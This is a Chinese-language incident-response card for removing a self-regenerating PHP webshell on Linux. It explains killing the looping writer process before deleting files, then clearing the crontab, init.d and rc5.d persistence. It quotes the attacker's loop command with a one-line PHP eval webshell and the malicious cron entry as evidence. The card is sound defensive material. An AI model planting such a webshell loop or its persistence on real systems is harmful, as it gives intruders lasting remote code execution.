---
id: defense-incident-response-process-immortal-webshell-kill-writer
title: 进程级不死马应急：先杀循环写码进程再删 shell，并清理 crontab/init.d/rc.d 多层持久化
type: scenario
domain: defense
path: defense/incident-response
technique: process-level-immortal-webshell-cleanup
aliases:
- 不死马清除
- 循环写 shell.php
- 竞争条件 webshell
- www-data sh while true 写马
- 删了又生成 webshell
- 先杀进程再删文件
tags:
- incident-response
- webshell
- immortal-shell
- linux
- process-investigation
- cron
- persistence
- cleanup-order
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V343
  verified_at: '2026-11-08T22:30:59+08:00'
  notes: 已对照原文图24-29/44-48核对 www-data while true 写 shell.php、ps+kill 顺序、/tmp .shell.php 与 ..shell/、rc5.d/S666shell→init.d/shell.sh、www 用户 crontab 每4分钟写马条目均与卡一致；先杀进程再删文件与多层持久化清理顺序正确。
---

## 一句话结论

网站目录里的 `shell.php` 删掉后立刻重生，通常不是「文件被隐藏」，而是有一个常驻 shell 进程在循环写码：`/bin/sh -c while true;do echo '<?php @eval($_REQUEST[cmd]);?>' > /www/wwwroot/shell.php;done`；正确处置顺序是先定位并 kill 所有写码进程（`ps aux | grep shell.php | awk '{print $2}' | xargs kill -9`），确认不再重生后再删文件，同时清理 crontab、`/etc/init.d/shell.sh` 与 `/etc/rc5.d/S666shell` 等同源持久化，否则重启或下一轮 cron 会再次写回。

## 原理

- **文件只是产物，进程才是本体**：循环 `while true; do echo ... > shell.php; done` 由 `www-data` 反复执行；管理员删除 `shell.php` 后，下一轮循环毫秒级重建，表现为「删不掉/删了又有」。
- **为什么先杀进程**：先删文件会打草惊蛇且失败；`ps aux | grep shell.php` 能直接看到完整写入命令（命令行里含目标路径和 payload），按 PID kill 后写码停止，再删文件才有效。
- **同源持久化多层存在**：本案在 `www` 用户 crontab 中还有 `*/4 * * * * /bin/sh -c "while true;do echo ... > /www/wwwroot/shell.php;done"`，以及直接写 `/tmp/.shell.php`、`/tmp/..shell/shell.php` 的条目；SysV 启动项 `/etc/rc5.d/S666shell -> /etc/init.d/shell.sh` 内同样是 `while true;do echo ... > .shell.php;done`。只处理文件或只杀进程都会留下复活路径。
- **竞争条件表现**：`cat shell.php` 偶尔为空或内容不完整，是因为写进程与读取竞争；多执行几次才能看到完整一句话木马。
- **隐藏文件/目录**：`/tmp/.shell.php`、`/tmp/..shell/shell.php` 用前导点与双点目录规避普通 `ls`；需要 `ls -al` 或 `find` 才能发现。
- **为什么需要多层排查**：进程级不死马常与 cron、init.d、systemd 组合，攻击者希望重启后继续写码；清理时必须按「进程 → 文件 → 计划任务 → 启动项」顺序逐层确认。

## 触发条件

- Linux Web 服务器（如 Apache/Nginx + PHP-FPM），Web 用户（`www-data`/`www`）可写网站目录。
- 攻击者已通过上传/注入拿到执行能力，投放了循环写码脚本或命令。
- 存在 `sh`/`bash` 可用、进程未被限制（如 `RLIMIT_NPROC`、cgroup 不严）。
- 管理员尚未清理或只删除了文件未杀进程。

## 利用步骤（应急视角的处置顺序）

1. 先固定证据：备份 `~/.bash_history`、`/root/.bash_history`、当前 `ps`/`netstat` 输出、可疑文件与 crontab 列表；避免后续命令覆盖历史。
2. 观察异常：`top` 看高 CPU 用户（本案 `www-data` 大量 `sh` 进程）；`ps aux | grep www` / `ps aux | grep shell.php` 找到完整写入命令与 PID 列表。
3. 杀写码进程：`ps aux | grep shell.php | awk '{print $2}' | xargs kill -9`；如有多个变体（写不同路径）按命令行关键字分别匹配。
4. 确认停止：再次 `ps aux | grep shell.php`（排除 grep 自身），并等待数秒观察文件是否重生；必要时 `cat shell.php` 多次确认。
5. 删除文件：`rm -f /www/wwwroot/shell.php` 及 `/tmp/.shell.php`、`/tmp/..shell/shell.php` 等；`rm -rf /tmp/..shell/`。
6. 清理计划任务：检查 `crontab -l -u www`、`-u <可疑用户>`、`-u root`，删除含 `while true`/写 shell 的条目；`crontab -r -u www` 会清空该用户全部任务，精确删除用 `crontab -e -u www`。
7. 清理启动项：`runlevel`、`cat /etc/rc.local`、`ls /etc/rc5.d/`，发现 `S666shell` → `ls -l /etc/rc5.d/S666shell` 找到 `/etc/init.d/shell.sh`，先 `rm /etc/init.d/shell.sh` 再 `rm /etc/rc5.d/S666shell`。
8. 复查：重新扫描 WebShell、检查 crontab/rc.d/进程/文件是否还有残留；重启后再次确认。

## PoC

```bash
# 1) 定位写码进程（命令行会显示完整 while true 写入语句）
ps aux | grep shell.php
# www-data 2785 ... /bin/sh -c while true;do echo '<?php @eval($_REQUEST[cmd]);?>' > /www/wwwroot/shell.php;done

# 2) 先杀进程
ps aux | grep shell.php | awk '{print $2}' | xargs kill -9

# 3) 再删文件
rm -f /www/wwwroot/shell.php

# 4) 清理同源持久化
crontab -l -u www
# */4 * * * * /bin/sh -c "while true;do echo '<?php @eval($_REQUEST[cmd]);?>' > /www/wwwroot/shell.php;done" &
crontab -e -u www        # 删除恶意行（或用 crontab -r -u www 清空）

ls -l /etc/rc5.d/S666shell    # -> /etc/init.d/shell.sh
rm -f /etc/init.d/shell.sh /etc/rc5.d/S666shell

# 5) 复查
ls -al /tmp | grep -E '\.shell|\.\.shell'
ps aux | grep -E 'shell\.php|while true'
```

说明：命令来自文中实验环境（CentOS/宝塔），路径与用户按实际目标调整；未在生产环境执行。

## 变体与关联

- [[pentest-persistence-php-self-deleting-loop-webshell]]：PHP 进程内 `ignore_user_abort` + `unlink(__FILE__)` + 循环重建的 Web 层不死马；本卡是 shell 进程级循环写码 + cron/init 多层持久化的应急清理。
- [[pentest-persistence-linux-cron-reverse-shell]]：cron 计划任务持久化的一般形式；本卡给出含 while 循环写马的 cron 条目识别。
- [[defense-incident-response-linux-c2-watchdog-cleanup-order]]：另一类「先断看门狗再杀主进程」的清理顺序，思路一致。
- 变体：写码进程可换 `php -r 'while(1){file_put_contents(...)}'`、Python、perl；可只写隐藏文件、随机文件名、多个路径；持久化可换 systemd timer、`/etc/cron.d`、profile.d。
- 边界：若 Web 进程被 cgroup/权限限制、写目录不可写、进程被 EDR 先杀，则不死马不成立。

## 检测与防御

- 检测（主机）：`www-data`/`www` 用户出现大量 `sh`/`bash` 子进程、CPU 持续偏高；`ps` 命令行含 `while true`、`echo '<?php`、写站点目录；同一文件在秒级反复出现/消失（inotify/auditd 可捕获）。
- 检测（持久化）：crontab 中出现 `while true`/写 shell 的条目；`/etc/rc*.d` 出现无对应软件包的 `S*` 启动脚本；`/etc/init.d` 出现 `shell.sh` 等异常脚本；`/tmp` 有 `.shell.php`、`..shell/`。
- 防御：Web 目录对 Web 用户只给必要写权限（上传目录单独隔离、禁 PHP 执行）；限制 `www-data` 创建子进程/执行 shell（cgroup、AppArmor/SELinux、`noexec` 上传目录）；监控 cron/init.d/rc.d 变更；部署 WebShell 查杀与文件完整性监控。
- 响应：按「证据 → 杀进程 → 删文件 → 清 cron/init/rc → 复查」顺序；重启后再确认无重生；轮换凭据并排查初始入口。
